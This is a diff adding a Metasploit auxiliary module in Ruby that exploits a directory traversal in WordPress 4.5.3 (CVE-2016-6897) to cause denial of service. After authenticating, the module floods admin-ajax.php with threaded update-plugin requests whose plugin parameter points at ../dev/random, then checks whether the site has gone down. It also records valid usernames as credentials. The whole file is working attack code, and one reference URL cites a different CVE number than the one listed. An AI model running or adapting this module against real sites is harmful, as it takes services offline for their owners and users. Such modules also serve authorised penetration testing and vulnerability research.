@@ -1,0 +1,162 @@
+##
+# This module requires Metasploit: http://www.metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Auxiliary::Dos
+
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name'            => 'WordPress Traversal Directory DoS',
+      'Description'     =>  %q{Directory traversal vulnerability in the wp_ajax_update_plugin function in wp-admin/includes/ajax-actions.php in WordPress 4.5.3 allows remote authenticated users to cause a denial of service or read certain text files via a .. (dot dot) in the plugin parameter to wp-admin/admin-ajax.php, as demonstrated by /dev/random read operations that deplete the entropy pool.},
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Yorick Koster',           # Vulnerability disclosure
+          'CryptisStudents'          # Metasploit module
+        ],
+      'References'      =>
+        [
+          ['CVE', '2016-6897'],
+          ['EDB', '40288'],
+          ['OVEID', 'OVE-20160712-0036'],
+          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2016-6896']
+        ],
+    ))
+
+    register_options(
+      [
+        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
+        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
+        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
+        OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
+        OptString.new('PASSWORD', [true, 'The password to send the requests with', ''])
+        ], self.class)
+  end
+
+  def rlimit
+    datastore['RLIMIT']
+  end
+
+  def username
+    datastore['USERNAME']
+  end
+
+  def password
+    datastore['PASSWORD']
+  end
+
+  def thread_count
+    datastore['THREADS']
+  end
+
+  def timeout
+    datastore['TIMEOUT']
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def user_exists(user)
+    exists = wordpress_user_exists?(user)
+    if exists
+      print_good("Username \"#{username}\" is valid")
+      report_cred(
+        ip: rhost,
+        port: rport,
+        user: user,
+        service_name: (ssl ? 'https' : 'http'),
+        proof: "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
+      )
+
+      return true
+    else
+      print_error("\"#{user}\" is not a valid username")
+      return false
+    end
+  end
+
+  def run
+    if wordpress_and_online?
+      print_status("Checking if user \"#{username}\" exists...")
+      unless user_exists(username)
+        print_error('Aborting operation - a valid username must be specified')
+        return
+      end
+
+      starting_thread = 1
+
+      cookie  = wordpress_login(username, password)
+      if cookie.nil?
+        print_error('Aborting operation - failed to authenticate')
+        return
+      end
+
+      while starting_thread < rlimit do
+        ubound = [rlimit - (starting_thread - 1), thread_count].min
+        print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
+
+        threads = []
+        1.upto(ubound) do |i|
+          threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
+            begin
+              # shell code
+              res = send_request_cgi( opts = {
+                'method' => 'POST',
+                'uri' => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
+                'vars_post' => {
+                  'action' => 'update-plugin',
+                  'plugin' => '../../../../../../../../../../dev/random'
+                },
+                'cookie' => cookie
+              }, timeout = 0.2)
+            rescue => e
+              print_error("Timed out during request #{(starting_thread - 1) + i}")
+            end
+          end
+        end
+
+        threads.each(&:join)
+
+        print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
+        starting_thread += ubound
+      end
+
+      if wordpress_and_online?
+        print_error("FAILED: #{target_uri} appears to still be online")
+      else
+        print_good("SUCCESS: #{target_uri} appears to be down")
+      end
+
+    else
+      print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress")
+    end
+  end
+end
